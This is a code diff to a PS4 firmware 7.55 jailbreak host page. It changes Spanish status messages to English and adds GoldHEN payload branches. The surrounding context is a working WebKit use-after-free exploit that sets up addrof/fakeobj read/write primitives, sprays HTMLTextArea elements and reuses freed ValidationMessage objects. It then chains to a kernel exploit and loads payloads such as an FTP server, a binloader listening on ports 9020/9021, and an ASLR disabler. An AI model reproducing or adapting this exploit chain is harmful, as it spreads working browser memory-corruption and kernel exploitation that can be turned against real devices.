@@ -34,6 +34,7 @@ var g_jsview_butterfly = null;
 var g_message_heading_leak = null;
 var g_message_body_leak = null;
 
+var g_textarea_div_elem = null;
 var g_obj_str = {};
 
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
@@ -115,9 +116,9 @@ function setupRW() {
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	if(localStorage.autoExploit=="true")
-		debug_log(" WebKit Completo activar Exploit para piratear !!");
+		debug_log("-> WebKit Exploit Complete.. Running Kernel Exploit !!");
 	else
-		debug_log(" WebKit Completo activar el  Exploit para piratear !!");
+		debug_log("-> WebKit Exploit Complete.. Run the Kernel Exploit to Jailbreak !!");
 
 	/* Getting code execution */
 	/* ... */
@@ -128,80 +129,87 @@ function setupRW() {
 
 function toggle_payload(pld){
 	if(pld == "exploit"){
-		document.getElementById("progress").innerHTML="Cargando nuevo Exploit.. por favor espere..!!";
+		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
 		preloadScripts(['jb/jb.js']);
 	}else if(pld == "exploit_old"){
-		document.getElementById("progress").innerHTML="Cargando  Exploit por favor espere..!!";
+		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
 		preloadScripts(['jb/oldjb.js']);
 	}else if(pld == "binloader"){
-		document.getElementById("progress").innerHTML="Esperando Carga Util.. enviar por el pueto 9020..";
+		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9020..";
 		preloadScripts(['payloads/preloader.js', 'payloads/loader.js']);
 	}else if(pld == "mira75X"){
-		document.getElementById("progress").innerHTML="cargando MIRA.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading MIRA.. Please wait..";
 		if(fw=="755"){
 			preloadScripts(['payloads/preloader.js', 'payloads/mira'+fw+'.js', 'payloads/loader.js']);
 		}else{
 			preloadScripts(['payloads/preloader'+fw+'.js', 'payloads/mira'+fw+'.js', 'payloads/loader.js']);	
 		}
 	}else if(pld == "mira2b"){
-		document.getElementById("progress").innerHTML="Cargando MIRA + SPOOF.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading MIRA + SPOOF.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/mira2b.js', 'payloads/loader.js']);
 	}else if(pld == "ftp"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Cargando.. Acceso en puerto 1337.."; }, 7000);
+		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Loaded.. Access at port 1337.."; }, 7000);
 		preloadScripts(['payloads/preloader.js', 'payloads/ftp.js', 'payloads/loader.js']);
 	}else if(pld == "app2usb"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/app2usb.js', 'payloads/loader.js']);
 	}else if(pld == "disableupdates"){
-		document.getElementById("progress").innerHTML=="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/disableupdates.js', 'payloads/loader.js']);
 	}else if(pld == "enableupdates"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/enableupdates.js', 'payloads/loader.js']);
 	}else if(pld == "backup"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/backup.js', 'payloads/loader.js']);
 	}else if(pld == "restore"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/restore.js', 'payloads/loader.js']);
 	}else if(pld == "rifrenamer"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/rifrenamer.js', 'payloads/loader.js']);
 	}else if(pld == "todex"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/todex.js', 'payloads/loader.js']);
 	}else if(pld == "dumper"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/dumper.js', 'payloads/loader.js']);
 	}else if(pld == "disableaslr"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/disableaslr.js', 'payloads/loader.js']);
 	}else if(pld == "kerneldumper"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/kerneldumper.js', 'payloads/loader.js']);
 	}else if(pld == "kernelclock"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/kernelclock.js', 'payloads/loader.js']);
 	}else if(pld == "fancontrol"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/fancontrol.js', 'payloads/loader.js']);
 	}else if(pld == "enablebrowser"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/enablebrowser.js', 'payloads/loader.js']);
 	}else if(pld == "historyblocker"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/historyblocker.js', 'payloads/loader.js']);
 	}else if(pld == "exitidu"){
-		document.getElementById("progress").innerHTML="Loading Payload.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/exitidu.js', 'payloads/loader.js']);
 	}else if(pld == "ps4debug"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/ps4debug.js', 'payloads/loader.js']);
 	}else if(pld == "goldhen"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		if(fw=="755"){
+			preloadScripts(['payloads/preloader.js', 'payloads/goldhen'+fw+'.js', 'payloads/loader.js']);
+		}else{
+			preloadScripts(['payloads/preloader'+fw+'.js', 'payloads/goldhen'+fw+'.js', 'payloads/loader.js']);	
+		}
+	}else if(pld == "goldhenold"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/goldhen.js', 'payloads/loader.js']);
 	}else if(pld == "webrte"){
-		document.getElementById("progress").innerHTML="cargando carga util.. por favor espere!!";
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['payloads/preloader.js', 'payloads/webrte.js', 'payloads/loader.js']);
 	}
 	if(window.postPayload)
@@ -212,10 +220,10 @@ function toggle_payload(pld){
 
 function payload_finished(payload)
 {
-	if(payload == "cargando paquete"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="Esperando carga util!! envia carga util por el puerto 9021"; }, 7000);
+	if(payload == "binloader"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021"; }, 7000);
 	} else if(payload != "exploit" && payload != "exploit_old"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="Pirateo PS4 7.55 Completo por *Elio* !!"; }, 7000);
+		setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.55 Payload Loaded Succesfully !!"; }, 7000);
 	}
 }
 
@@ -276,7 +284,7 @@ function cleanup() {
  */
 function confuseTargetObjRound2() {
 	if (findTargetObj() === false)
-		die("[!]  Software no Compatible.");
+		die("[!] Failed to reuse target obj.");
 
 	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
 
@@ -379,7 +387,7 @@ function leakJSC() {
 	 * /!\ 
 	 */
 
-	debug_log("Desbloqueando la Seguridad "  + g_jsview_leak);
+	debug_log("-> JSArrayBufferView: " + g_jsview_leak);
 
 	/* Run the exploit again */
 	prepareUAF();
@@ -405,7 +413,7 @@ function confuseTargetObjRound1() {
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
 	 * the next 5s
 	 */
-	setTimeout(function(){leakJSC();}, 6000);
+	setTimeout(leakJSC, 6000);
 }
 
 function handle2() {
@@ -455,13 +463,13 @@ function reuseTargetObj() {
 function dumpTargetObj() {
 	debug_log("-> m_timer: " + g_timer_leak);
 	debug_log("-> m_messageHeading: " + g_message_heading_leak);
-	debug_log(" Pulverizando codigo: " + g_message_body_leak);
+	debug_log("-> m_messageBody: " + g_message_body_leak);
 }
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("Vulnerabilidad valida encontrada");
+			debug_log("-> Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
@@ -508,9 +516,9 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log( "Destrozando elemento HTML...");
+	debug_log("-> Spraying HTMLTextareaElement ...");
 
-	let textarea_div_elem = window.xyu = document.createElement("div");
+	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
@@ -522,7 +530,7 @@ function sprayHTMLTextArea() {
 	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
 	 * allocation of the node attributes and an IsoHeap allocation of the
 	 * Element. The virtual page layout will look something like that:
-	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...] elio
+	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...] DARKMODDER
 	 */
 	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
 		textarea_div_elem.appendChild(element.cloneNode());
